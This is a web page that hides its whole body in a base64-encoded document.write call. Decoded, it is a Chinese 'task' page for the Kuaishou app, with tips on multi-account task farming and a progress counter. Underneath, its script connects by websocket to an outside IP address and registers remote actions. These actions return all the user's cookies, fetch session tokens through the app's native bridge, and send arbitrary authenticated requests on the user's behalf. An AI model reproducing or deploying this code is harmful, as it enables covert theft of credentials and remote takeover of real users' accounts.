document.write(decodeURIComponent(escape(atob('CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPHRpdGxlPmtz5Lu75YqhPC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlByYWdtYSIgY29udGVudD0ibm8tY2FjaGUiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iQ2FjaGUtQ29udHJvbCIgY29udGVudD0ibm8tY2FjaGUsIG5vLXN0b3JlLCBtdXN0LXJldmFsaWRhdGUiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iRXhwaXJlcyIgY29udGVudD0iMCI+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9naC5ha2Fzcy5jbi95aW50LXRlY2gvc2VraXJvLXNhbXBsZXMvcmVmcy9oZWFkcy9tYWluL2RlbW8td2ViL3Nla2lyb1dlYk1pbmkuanMiCiAgICAgICAgICAgIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIHJlZmVycmVycG9saWN5PSJuby1yZWZlcnJlciI+PC9zY3JpcHQ+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmNGY0ZjQ7CiAgICAgICAgICAgIGNvbG9yOiAjMzMzOwogICAgICAgIH0KICAgICAgICBoMSB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMjRweDsKICAgICAgICAgICAgbWFyZ2luOiAyMHB4IDA7CiAgICAgICAgICAgIGNvbG9yOiAjMzMzOwogICAgICAgIH0KICAgICAgICAuYnV0dG9uIHsKICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgICAgICBwYWRkaW5nOiAxNXB4IDMwcHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMThweDsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBjcmltc29uOwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDEwcHg7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgMnB4IDVweCByZ2JhKDAsIDAsIDAsIDAuMSk7CiAgICAgICAgfQogICAgICAgIC5idXR0b246aG92ZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBkYXJrcmVkOwogICAgICAgIH0KICAgICAgICBAbWVkaWEgKG1heC13aWR0aDogNzY4cHgpIHsKICAgICAgICAgICAgYm9keSB7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaDEgewogICAgICAgICAgICAgICAgZm9udC1zaXplOiAyMHB4OwogICAgICAgICAgICAgICAgbWFyZ2luOiAxNXB4IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLmJ1dHRvbiB7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgICAgICAgICBwYWRkaW5nOiAxMnB4IDI0cHg7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+CjxzY3JpcHQ+CiAgICB2YXIgY2xpZW50SWQgPSBkb2N1bWVudC5jb29raWUubWF0Y2goJ3VzZXJJZD0oXFx3Kyk7JylbMV0KCiAgICBmdW5jdGlvbiBnb1RvS3MoKSB7CiAgICAgICAgY29uc3QgaWZyYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ215SWZyYW1lJyk7CiAgICAgICAgaWZyYW1lLnNyYyA9ICdrd2FpOi8vdHViZS9zcXVhcmUnCiAgICB9CgogICAgZnVuY3Rpb24gZ2V0RCgpIHsKICAgICAgICBsZXQgY3VycmVudERhdGUgPSBuZXcgRGF0ZSgpOwogICAgICAgIGxldCB5ZWFyID0gY3VycmVudERhdGUuZ2V0RnVsbFllYXIoKTsKICAgICAgICBsZXQgbW9udGggPSBTdHJpbmcoY3VycmVudERhdGUuZ2V0TW9udGgoKSArIDEpLnBhZFN0YXJ0KDIsICcwJyk7CiAgICAgICAgbGV0IGRheSA9IFN0cmluZyhjdXJyZW50RGF0ZS5nZXREYXRlKCkpLnBhZFN0YXJ0KDIsICcwJyk7CiAgICAgICAgcmV0dXJuIGAke3llYXJ9LSR7bW9udGh9LSR7ZGF5fWA7CiAgICB9CgogICAgdmFyIGFsbFByb2Nlc3MgPSAwOwogICAgd2luZG93Lm9ubG9hZCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICBsZXQgbG9jYWxQID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oZ2V0RCgpKQogICAgICAgIGlmIChsb2NhbFApIHsKICAgICAgICAgICAgYWxsUHJvY2VzcyA9IHBhcnNlSW50KGxvY2FsUCkKICAgICAgICB9CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInByb2Nlc3MiKS5pbm5lckhUTUwgPSBjbGllbnRJZCArICIgPGJyPiIgKyBnZXREKCkgKyAiOuW9k+WJjeS7u+WKoei/m+W6pjoiICsgYWxsUHJvY2VzczsKICAgIH0KCiAgICBmdW5jdGlvbiB1cGRhdGUoKSB7CiAgICAgICAgYWxsUHJvY2VzcyArPSAxOwogICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKGdldEQoKSwgYWxsUHJvY2VzcykKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicHJvY2VzcyIpLmlubmVySFRNTCA9IGNsaWVudElkICsgIiA8YnI+IiArIGdldEQoKSArICI65b2T5YmN5Lu75Yqh6L+b5bqmOiIgKyBhbGxQcm9jZXNzOwogICAgfQo8L3NjcmlwdD4KCjxib2R5Pgo8aWZyYW1lIGlkPSJteUlmcmFtZSIgd2lkdGg9IjAiIGhlaWdodD0iMCI+PC9pZnJhbWU+CjxpbWcgc3JjPSJodHRwczovL3MyLTExMTQyMi5rd2ltZ3MuY29tL2tvcy9ubGF2MTExNDIyL3BjLXZpc2lvbi9pbWcvbmV3LWxvZ28uNzljM2JmZTEuc3ZnIiAgYWx0PSJsb2dvIi8+CjxoMT7mj5DnpLo6IOWBmuS7u+WKoeaXtu+8jOS/neaMgeWxj+W5leW4uOmHjzwvaDE+CjxoMT7mj5DnpLo6IGtzL2tz5p6B6YCf54mI5YiG5Yir55m75b2V5LiN5ZCM55qE6LSm5Y+35Y+v5Lul5YGa5pu05aSa5qyh5Lu75YqhPC9oMT4KPGgxPuaPkOekujog5Yip55So5omL5py657O757uf55qE5YiG6Lqr6IO95Yqb77yM5LiA5Y+w5omL5py65Y+v5Lul55m75aSa5Liq5Y+344CCPC9oMT4KPGgxPuaPkOekujog5LiN6KaB5YiH5o2i6LSm5Y+355m75b2V77yM6KaB5LiN54S25Lya6ZmN5L2O6LSm5Y+36LSo6YeP77yM5b2x5ZON5YGa5Lu75Yqh55qE5qyh5pWw44CCPC9oMT4KPGgxPuaPkOekujog5aaC5p6c6LaF6L+HMeWIhumSn+i/m+W6puS4jei1sO+8jOWPr+S7pei/h+S4gOS4quWwj+aXtuWGjeivleivleOAgjwvaDE+CjxoMT7otKblj7fotKjph4/lt67vvJ/or5Xor5XovrnlgZrku7vliqHovrnlhbvlj7c8L2gxPgo8YnV0dG9uIGNsYXNzPSJidXR0b24iIG9uY2xpY2s9ImdvVG9LcygpIj7lhbvlj7c8L2J1dHRvbj4KPGgxPuaCqOeahOi0puWPt+aYr++8mjxzcGFuIGlkPSJzcGFuX3VpZCI+PC9zcGFuPjwvaDE+CjxoMSBpZD0icHJvY2VzcyI+PC9oMT4KPC9ib2R5PgoKPHNjcmlwdD4KICAgIHdpbmRvdy5nZW5faWRzID0gKGZ1bmN0aW9uICgpIHsKICAgICAgICBjb25zdCBVZyA9IE51bWJlci5NQVhfU0FGRV9JTlRFR0VSIHx8IDkwMDcxOTkyNTQ3NDA5OTE7CiAgICAgICAgY29uc3QgbiA9ICIiLmNvbmNhdChEYXRlLm5vdygpKTsKICAgICAgICBjb25zdCBvID0gbi5zbGljZShuLmxlbmd0aCAtIDkpOwogICAgICAgIGNvbnN0IHAgPSAiIiArIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDgwMCkgKyBvICsgIjAwMDAiOwogICAgICAgIGNvbnN0IE1RX0Jhc2UgPSBOdW1iZXIocCk7CiAgICAgICAgbGV0IE1RX0luZGV4ID0gMTsKICAgICAgICByZXR1cm4gZnVuY3Rpb24gKCkgewogICAgICAgICAgICBsZXQgYSA9IE1RX0Jhc2UgKyBNUV9JbmRleCsrOwogICAgICAgICAgICBpZiAoYSArIDEgPj0gVWcpIE1RX0luZGV4ID0gMTsKICAgICAgICAgICAgbGV0IGIgPSAoZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgdmFyIGUgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTsKICAgICAgICAgICAgICAgICJ1bmRlZmluZWQiICE9IHR5cGVvZiBwZXJmb3JtYW5jZSAmJgogICAgICAgICAgICAgICAgImZ1bmN0aW9uIiA9PSB0eXBlb2YgcGVyZm9ybWFuY2Uubm93ICYmCiAgICAgICAgICAgICAgICAoZSArPSBwZXJmb3JtYW5jZS5ub3coKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gInh4eHh4eHh4X3h4eHhfNHh4eF95eHh4X3h4eHh4eHh4eHh4eCIucmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAvW3h5XS9nLAogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uICh0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciByID0gKGUgKyAxNiAqIE1hdGgucmFuZG9tKCkpICUgMTYgfCAwOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKGUgPSBNYXRoLmZsb29yKGUgLyAxNikpLCAoIngiID09PSB0ID8gciA6ICgzICYgcikgfCA4KS50b1N0cmluZygxNikKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICB9KSgpOwogICAgICAgICAgICByZXR1cm4gWyIiICsgYSwgIiIgKyBiXTsKICAgICAgICB9OwogICAgfSkoKTsKCiAgICBmdW5jdGlvbiBLd2FpX2h0dHBSZXF1ZXN0KHVybCwgbWV0aG9kLCBib2R5LCBoZWFkZXJzLCByZXNvbHZlLCByZWplY3QpIHsKICAgICAgICBsZXQgW2EsIGJdID0gZ2VuX2lkcygpOwogICAgICAgIGNvbnN0IGNpZCA9ICJ5b2RhX2t1YWlzaG91X3BsdWdpbl9jYWxsYmFja19Ld2FpX2h0dHBSZXF1ZXN0XyIgKyBiOwogICAgICAgIHdpbmRvd1tjaWRdID0gZnVuY3Rpb24gKGRhdGEpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZGF0YSA9PSAic3RyaW5nIikgewogICAgICAgICAgICAgICAgICAgIHJlc29sdmUoZGF0YSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHJlc29sdmUoSlNPTi5zdHJpbmdpZnkoZGF0YSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZGVsZXRlIHdpbmRvd1tjaWRdOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICByZWplY3QoZS50b1N0cmluZygpKTsKICAgICAgICAgICAgfQogICAgICAgIH07CiAgICAgICAgaWYgKCFoZWFkZXJzWyJVc2VyLUFnZW50Il0gJiYgIWhlYWRlcnNbInVzZXItYWdlbnQiXSkgewogICAgICAgICAgICBoZWFkZXJzWyJVc2VyLUFnZW50Il0gPSAia3dhaS1hbmRyb2lkIjsKICAgICAgICB9CiAgICAgICAgaWYgKCFoZWFkZXJzWyJDb250ZW50LVR5cGUiXSAmJiAhaGVhZGVyc1siY29udGVudC10eXBlIl0pIHsKICAgICAgICAgICAgaGVhZGVyc1siQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjsKICAgICAgICB9CiAgICAgICAgY29uc3QgYXJncyA9IHsKICAgICAgICAgICAgdXJsOiB1cmwsCiAgICAgICAgICAgIG1ldGhvZDogbWV0aG9kLnRvVXBwZXJDYXNlKCksCiAgICAgICAgICAgIGJvZHk6IGJvZHksCiAgICAgICAgICAgIGhlYWRlcjogaGVhZGVycywKICAgICAgICAgICAgY2FsbGJhY2s6IGNpZCwKICAgICAgICB9OwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHdpbmRvdy5fX3lvZGFCcmlkZ2VfXy5pbnZva2UoCiAgICAgICAgICAgICAgICAiS3dhaSIsCiAgICAgICAgICAgICAgICAiaHR0cFJlcXVlc3QiLAogICAgICAgICAgICAgICAgSlNPTi5zdHJpbmdpZnkoYXJncyksCiAgICAgICAgICAgICAgICBhCiAgICAgICAgICAgICk7CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICByZWplY3QoZS50b1N0cmluZygpKTsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gbWFrZUNsaWVudChjbGllbnRJZCkgewogICAgICAgIGxldCBncm91cCA9ICJ4eHgtZGQiOwogICAgICAgIHZhciBjbGllbnQgPSBuZXcgU2VraXJvQ2xpZW50KAogICAgICAgICAgICAvLyAid3M6Ly8xMTIuNS4zNy4xNzI6NTYxMi9idXNpbmVzcy9yZWdpc3Rlcj9ncm91cD14eHgtZGQmY2xpZW50SWQ9eC0iICsKICAgICAgICAgICAgIndzOi8vMjEyLjE5Mi4xMy4yNDQ6NTYxMi9idXNpbmVzcy9yZWdpc3Rlcj9ncm91cD0iICsgZ3JvdXAgKyAiJmNsaWVudElkPXgtIiArIGNsaWVudElkCiAgICAgICAgKTsKCiAgICAgICAgY2xpZW50LnJlZ2lzdGVyQWN0aW9uKCJnZXRDb29raWUiLCBmdW5jdGlvbiAocmVxdWVzdCwgcmVzb2x2ZSwgcmVqZWN0KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoIXJlcXVlc3QuY2tfbmFtZSkgewogICAgICAgICAgICAgICAgICAgIGNvb2tpZVN0b3JlCiAgICAgICAgICAgICAgICAgICAgICAgIC5nZXRBbGwoKQogICAgICAgICAgICAgICAgICAgICAgICAudGhlbihmdW5jdGlvbiAoaSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzb2x2ZShKU09OLnN0cmluZ2lmeSh7Y29va2llczogaX0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgLmNhdGNoKChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZS50b1N0cmluZygpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGNvb2tpZVN0b3JlCiAgICAgICAgICAgICAgICAgICAgICAgIC5nZXQocmVxdWVzdC5ja19uYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAudGhlbihmdW5jdGlvbiAoaSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzb2x2ZShpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgLmNhdGNoKChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZS50b1N0cmluZygpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIHJlamVjdChlLnRvU3RyaW5nKCkpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgY2xpZW50LnJlZ2lzdGVyQWN0aW9uKCJnZXRTaWRUb2tlbiIsIGZ1bmN0aW9uIChyZXF1ZXN0LCByZXNvbHZlLCByZWplY3QpIHsKICAgICAgICAgICAgY29uc3Qgc2lkID0gcmVxdWVzdFsic2lkIl07CiAgICAgICAgICAgIGlmIChzaWQgPT09IHVuZGVmaW5lZCB8fCBzaWQubGVuZ3RoID09IDApIHsKICAgICAgICAgICAgICAgIHJlamVjdCgicmVxdWVzdC5zaWQgZXJyb3IgPT4gc2lkOiIgKyBzaWQpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxldCBbYSwgYl0gPSBnZW5faWRzKCk7CiAgICAgICAgICAgIGNvbnN0IGNpZCA9ICJ5b2RhX2t1YWlzaG91X3BsdWdpbl9jYWxsYmFja19Ld2FpX2dldFNpZFRva2VuXyIgKyBiOwogICAgICAgICAgICB3aW5kb3dbY2lkXSA9IGZ1bmN0aW9uIChkYXRhKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZGF0YSA9PSAic3RyaW5nIikgewogICAgICAgICAgICAgICAgICAgICAgICByZXNvbHZlKGRhdGEpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmUoSlNPTi5zdHJpbmdpZnkoZGF0YSkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBkZWxldGUgd2luZG93W2NpZF07CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgcmVqZWN0KGUudG9TdHJpbmcoKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGNvbnN0IGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBzaWQ6IHNpZCwKICAgICAgICAgICAgICAgIGZvcmNlUmVmcmVzaDogdHJ1ZSwKICAgICAgICAgICAgICAgIGNhbGxiYWNrOiBjaWQsCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICB3aW5kb3cuX195b2RhQnJpZGdlX18uaW52b2tlKAogICAgICAgICAgICAgICAgICAgICJLd2FpIiwKICAgICAgICAgICAgICAgICAgICAiZ2V0U2lkVG9rZW4iLAogICAgICAgICAgICAgICAgICAgIEpTT04uc3RyaW5naWZ5KGFyZ3MpLAogICAgICAgICAgICAgICAgICAgIGEKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIHJlamVjdChlLnRvU3RyaW5nKCkpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgY2xpZW50LnJlZ2lzdGVyQWN0aW9uKCJyZWxhdGlvbkxpc3QiLCBmdW5jdGlvbiAocmVxdWVzdCwgcmVzb2x2ZSwgcmVqZWN0KSB7CiAgICAgICAgICAgIGNvbnN0IHJpZCA9IHJlcXVlc3RbImlkIl07CiAgICAgICAgICAgIGlmIChyaWQgPT09IHVuZGVmaW5lZCB8fCByaWQubGVuZ3RoICE9IDEwKSB7CiAgICAgICAgICAgICAgICByZWplY3QoInJlcXVlc3QuaWQgZXJyb3IgPT4gaWQ6IiArIHJpZCk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY29uc3QgdXJsID0gImh0dHBzOi8vYXoyLWFwaS1qcy5naWZzaG93LmNvbS9yZXN0L24vaW50aW1hdGUvcmVsYXRpb24vbGlzdCI7CiAgICAgICAgICAgIGNvbnN0IG1ldGhvZCA9ICJQT1NUIjsKICAgICAgICAgICAgY29uc3QgYm9keSA9ICJvd25lcklkPSIgKyByaWQ7CiAgICAgICAgICAgIGNvbnN0IGhlYWRlcnMgPSB7fTsKICAgICAgICAgICAgS3dhaV9odHRwUmVxdWVzdCh1cmwsIG1ldGhvZCwgYm9keSwgaGVhZGVycywgcmVzb2x2ZSwgcmVqZWN0KTsKICAgICAgICB9KTsKICAgICAgICBjbGllbnQucmVnaXN0ZXJBY3Rpb24oInJlcXVlc3REYXRhIiwgZnVuY3Rpb24gKHJlcXVlc3QsIHJlc29sdmUsIHJlamVjdCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgbGV0IHVybCA9IHJlcXVlc3RbInVybCJdOwogICAgICAgICAgICAgICAgY29uc3QgbWV0aG9kID0gIlBPU1QiOwogICAgICAgICAgICAgICAgbGV0IGJvZHkgPSByZXF1ZXN0WyJib2R5Il07CiAgICAgICAgICAgICAgICBsZXQgdHlwZSA9IHJlcXVlc3RbInR5cGUiXTsKICAgICAgICAgICAgICAgIGxldCBoZWFkZXJzID0ge307CiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICAgICAgaGVhZGVyc1siQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEt3YWlfaHR0cFJlcXVlc3QodXJsLCBtZXRob2QsIGJvZHksIGhlYWRlcnMsIHJlc29sdmUsIHJlamVjdCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIHJlamVjdChlLnRvU3RyaW5nKCkpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93LmNsaWVudCA9IGNsaWVudDsKICAgIH0KCiAgICBhc3luYyBmdW5jdGlvbiBrc19tYWluKCkgewogICAgICAgIGxldCB1aWQ7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdWlkID0gKGF3YWl0IGNvb2tpZVN0b3JlLmdldCgidXNlcklkIikpLnZhbHVlOwogICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICB9CiAgICAgICAgdmFyIGNsaWVudElkOwogICAgICAgIGlmICh1aWQgIT09IHVuZGVmaW5lZCAmJiB1aWQubGVuZ3RoICE9PSAwKSB7CiAgICAgICAgICAgIGNsaWVudElkID0gdWlkOwogICAgICAgICAgICBtYWtlQ2xpZW50KGNsaWVudElkKTsKICAgICAgICAgICAgZ2xvYmFsVGhpcy51aWQgPSBjbGllbnRJZDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjbGllbnRJZCA9ICLor7fliLfmlrDpobXpnaIiOwogICAgICAgIH0KICAgICAgICBjb25zb2xlLmxvZygiZ2V0IHVpZDogIiArIGNsaWVudElkKTsKICAgIH0KCiAgICBsZXQga2tra2tra2trID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkgewogICAgICAgIGlmICh3aW5kb3cuU2VraXJvQ2xpZW50KSB7CiAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoa2tra2tra2trKTsKICAgICAgICAgICAga3NfbWFpbigpOwogICAgICAgIH0KICAgIH0sIDEwMCk7Cjwvc2NyaXB0PgoKPC9odG1sPg=='))));
window.onload();
